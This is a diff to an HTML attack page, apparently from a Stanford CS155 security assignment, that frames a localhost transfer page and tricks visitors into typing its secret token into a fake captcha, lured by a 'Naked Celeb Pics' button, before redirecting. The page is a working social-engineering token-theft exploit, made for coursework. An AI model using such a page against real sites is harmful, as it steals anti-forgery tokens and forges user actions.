@@ -1,3 +1,7 @@
+<head>
+  <link href='http://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
+</head>
+
 <style type="text/css">
   iframe {
   height: 115%;
@@ -6,14 +10,28 @@
   border: none;
   }
   p {
+  font-family: Montserrat, sans-serif;
   color: #7d7d7d;
+  height: 19px;
+  margin-left: 20px;
+  }
+  button {
+  font-family: Montserrat, sans-serif;
+  margin-top: 10px;
+  height: 19px;
+  }
+  input {
+  font-family: Montserrat, sans-serif;
+  height: 19px;
+  margin-left: 20px;
+  margin-top: 10px;
   }
 </style>
 <iframe src="http://localhost:3000/super_secure_transfer" scrolling="no"></iframe>
 <p>Please enter the "super secret token" displayed above to prove you're not a bot!</p>
 
 <input id="token" type="text" placeholder="Captcha">
-<button onClick="gotEm()">Celebrity Naked Photos!!</button>
+<button onClick="gotEm()">Confirm (+ Naked Celeb Pics!!)</button>
 
 <script>
 function gotEm() {
@@ -27,7 +45,7 @@ function gotEm() {
   } catch (err) {
     // Do nothing on inevitable XSS error
   } finally {
-    window.location = "http://crypto.stanford.edu/cs155/";
+    window.top.location = "http://crypto.stanford.edu/cs155/";
   }
 }
 </script>
